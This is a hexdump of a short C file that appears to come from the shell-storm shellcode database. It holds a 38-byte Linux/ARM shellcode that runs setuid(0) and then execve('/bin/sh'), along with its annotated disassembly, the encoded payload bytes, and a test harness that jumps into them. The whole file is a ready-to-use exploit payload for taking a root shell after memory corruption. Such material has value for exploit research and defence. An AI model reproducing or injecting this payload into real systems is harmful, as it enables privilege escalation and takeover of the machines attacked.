00000000  2f 2a 0a 54 69 74 6c 65  3a 20 20 4c 69 6e 75 78  |/*.Title:  Linux|
00000010  2f 41 52 4d 20 2d 20 73  65 74 75 69 64 28 30 29  |/ARM - setuid(0)|
00000020  20 26 20 65 78 65 63 76  65 28 22 2f 62 69 6e 2f  | & execve("/bin/|
00000030  73 68 22 2c 22 2f 62 69  6e 2f 73 68 22 2c 30 29  |sh","/bin/sh",0)|
00000040  20 2d 20 33 38 20 62 79  74 65 73 0a 44 61 74 65  | - 38 bytes.Date|
00000050  3a 20 20 20 32 30 31 30  2d 30 36 2d 32 39 0a 54  |:   2010-06-29.T|
00000060  65 73 74 65 64 3a 20 41  52 4d 39 32 36 45 4a 2d  |ested: ARM926EJ-|
00000070  53 20 72 65 76 20 35 20  28 76 35 6c 29 0a 0a 41  |S rev 5 (v5l)..A|
00000080  75 74 68 6f 72 3a 20 4a  6f 6e 61 74 68 61 6e 20  |uthor: Jonathan |
00000090  53 61 6c 77 61 6e 0a 57  65 62 3a 20 20 20 20 68  |Salwan.Web:    h|
000000a0  74 74 70 3a 2f 2f 73 68  65 6c 6c 2d 73 74 6f 72  |ttp://shell-stor|
000000b0  6d 2e 6f 72 67 20 7c 20  68 74 74 70 3a 2f 2f 74  |m.org | http://t|
000000c0  77 69 74 74 65 72 2e 63  6f 6d 2f 6a 6f 6e 61 74  |witter.com/jonat|
000000d0  68 61 6e 73 61 6c 77 61  6e 0a 0a 21 20 44 61 74  |hansalwan..! Dat|
000000e0  61 62 61 73 65 20 6f 66  20 73 68 65 6c 6c 63 6f  |abase of shellco|
000000f0  64 65 73 20 68 74 74 70  3a 2f 2f 77 77 77 2e 73  |des http://www.s|
00000100  68 65 6c 6c 2d 73 74 6f  72 6d 2e 6f 72 67 2f 73  |hell-storm.org/s|
00000110  68 65 6c 6c 63 6f 64 65  2f 0a 0a 0a 20 20 20 20  |hellcode/...    |
00000120  38 30 35 34 3a 09 65 32  38 66 33 30 30 31 20 09  |8054:.e28f3001 .|
00000130  61 64 64 09 72 33 2c 20  70 63 2c 20 23 31 09 3b  |add.r3, pc, #1.;|
00000140  20 30 78 31 0a 20 20 20  20 38 30 35 38 3a 09 65  | 0x1.    8058:.e|
00000150  31 32 66 66 66 31 33 20  09 62 78 09 72 33 0a 20  |12fff13 .bx.r3. |
00000160  20 20 20 38 30 35 63 3a  09 31 62 32 34 20 20 20  |   805c:.1b24   |
00000170  20 20 20 09 73 75 62 73  09 72 34 2c 20 72 34 2c  |   .subs.r4, r4,|
00000180  20 72 34 0a 20 20 20 20  38 30 35 65 3a 09 31 63  | r4.    805e:.1c|
00000190  32 30 20 20 20 20 20 20  09 61 64 64 73 09 72 30  |20      .adds.r0|
000001a0  2c 20 72 34 2c 20 23 30  0a 20 20 20 20 38 30 36  |, r4, #0.    806|
000001b0  30 3a 09 32 37 31 37 20  20 20 20 20 20 09 6d 6f  |0:.2717      .mo|
000001c0  76 73 09 72 37 2c 20 23  32 33 0a 20 20 20 20 38  |vs.r7, #23.    8|
000001d0  30 36 32 3a 09 64 66 30  31 20 20 20 20 20 20 09  |062:.df01      .|
000001e0  73 76 63 09 31 0a 20 20  20 20 38 30 36 34 3a 09  |svc.1.    8064:.|
000001f0  34 36 37 38 20 20 20 20  20 20 09 6d 6f 76 09 72  |4678      .mov.r|
00000200  30 2c 20 70 63 0a 20 20  20 20 38 30 36 36 3a 09  |0, pc.    8066:.|
00000210  33 30 30 61 20 20 20 20  20 20 09 61 64 64 73 09  |300a      .adds.|
00000220  72 30 2c 20 23 31 30 0a  20 20 20 20 38 30 36 38  |r0, #10.    8068|
00000230  3a 09 39 30 30 31 20 20  20 20 20 20 09 73 74 72  |:.9001      .str|
00000240  09 72 30 2c 20 5b 73 70  2c 20 23 34 5d 0a 20 20  |.r0, [sp, #4].  |
00000250  20 20 38 30 36 61 3a 09  61 39 30 31 20 20 20 20  |  806a:.a901    |
00000260  20 20 09 61 64 64 09 72  31 2c 20 73 70 2c 20 23  |  .add.r1, sp, #|
00000270  34 0a 20 20 20 20 38 30  36 63 3a 09 31 61 39 32  |4.    806c:.1a92|
00000280  20 20 20 20 20 20 09 73  75 62 73 09 72 32 2c 20  |      .subs.r2, |
00000290  72 32 2c 20 72 32 0a 20  20 20 20 38 30 36 65 3a  |r2, r2.    806e:|
000002a0  09 32 37 30 62 20 20 20  20 20 20 09 6d 6f 76 73  |.270b      .movs|
000002b0  09 72 37 2c 20 23 31 31  0a 20 20 20 20 38 30 37  |.r7, #11.    807|
000002c0  30 3a 09 64 66 30 31 20  20 20 20 20 20 09 73 76  |0:.df01      .sv|
000002d0  63 09 31 0a 20 20 20 20  38 30 37 32 3a 09 32 66  |c.1.    8072:.2f|
000002e0  32 66 20 20 20 20 20 20  09 63 6d 70 09 72 37 2c  |2f      .cmp.r7,|
000002f0  20 23 34 37 0a 20 20 20  20 38 30 37 34 3a 09 36  | #47.    8074:.6|
00000300  39 36 32 20 20 20 20 20  20 09 6c 64 72 09 72 32  |962      .ldr.r2|
00000310  2c 20 5b 72 34 2c 20 23  32 30 5d 0a 20 20 20 20  |, [r4, #20].    |
00000320  38 30 37 36 3a 09 32 66  36 65 20 20 20 20 20 20  |8076:.2f6e      |
00000330  09 63 6d 70 09 72 37 2c  20 23 31 31 30 0a 20 20  |.cmp.r7, #110.  |
00000340  20 20 38 30 37 38 3a 09  36 38 37 33 20 20 20 20  |  8078:.6873    |
00000350  20 20 09 6c 64 72 09 72  33 2c 20 5b 72 36 2c 20  |  .ldr.r3, [r6, |
00000360  23 34 5d 0a 2a 2f 0a 0a  23 69 6e 63 6c 75 64 65  |#4].*/..#include|
00000370  20 3c 73 74 64 69 6f 2e  68 3e 0a 0a 63 68 61 72  | <stdio.h>..char|
00000380  20 2a 53 43 20 3d 20 22  5c 78 30 31 5c 78 33 30  | *SC = "\x01\x30|
00000390  5c 78 38 66 5c 78 65 32  22 0a 20 20 20 20 20 20  |\x8f\xe2".      |
000003a0  20 20 20 20 20 22 5c 78  31 33 5c 78 66 66 5c 78  |     "\x13\xff\x|
000003b0  32 66 5c 78 65 31 22 0a  20 20 20 20 20 20 20 20  |2f\xe1".        |
000003c0  20 20 20 22 5c 78 32 34  5c 78 31 62 5c 78 32 30  |   "\x24\x1b\x20|
000003d0  5c 78 31 63 22 0a 20 20  20 20 20 20 20 20 20 20  |\x1c".          |
000003e0  20 22 5c 78 31 37 5c 78  32 37 5c 78 30 31 5c 78  | "\x17\x27\x01\x|
000003f0  64 66 22 0a 20 20 20 20  20 20 20 20 20 20 20 22  |df".           "|
00000400  5c 78 37 38 5c 78 34 36  5c 78 30 61 5c 78 33 30  |\x78\x46\x0a\x30|
00000410  22 0a 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |".           "\x|
00000420  30 31 5c 78 39 30 5c 78  30 31 5c 78 61 39 22 0a  |01\x90\x01\xa9".|
00000430  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 39 32  |           "\x92|
00000440  5c 78 31 61 5c 78 30 62  5c 78 32 37 22 0a 20 20  |\x1a\x0b\x27".  |
00000450  20 20 20 20 20 20 20 20  20 22 5c 78 30 31 5c 78  |         "\x01\x|
00000460  64 66 5c 78 32 66 5c 78  32 66 22 0a 20 20 20 20  |df\x2f\x2f".    |
00000470  20 20 20 20 20 20 20 22  5c 78 36 32 5c 78 36 39  |       "\x62\x69|
00000480  5c 78 36 65 5c 78 32 66  22 0a 20 20 20 20 20 20  |\x6e\x2f".      |
00000490  20 20 20 20 20 22 5c 78  37 33 5c 78 36 38 22 3b  |     "\x73\x68";|
000004a0  0a 0a 0a 69 6e 74 20 6d  61 69 6e 28 76 6f 69 64  |...int main(void|
000004b0  29 0a 7b 0a 20 20 20 20  20 20 20 20 66 70 72 69  |).{.        fpri|
000004c0  6e 74 66 28 73 74 64 6f  75 74 2c 22 4c 65 6e 67  |ntf(stdout,"Leng|
000004d0  74 68 3a 20 25 64 5c 6e  22 2c 73 74 72 6c 65 6e  |th: %d\n",strlen|
000004e0  28 53 43 29 29 3b 0a 20  20 20 20 20 20 20 20 28  |(SC));.        (|
000004f0  2a 28 76 6f 69 64 28 2a  29 28 29 29 20 53 43 29  |*(void(*)()) SC)|
00000500  28 29 3b 0a 72 65 74 75  72 6e 20 30 3b 0a 7d     |();.return 0;.}|
0000050f
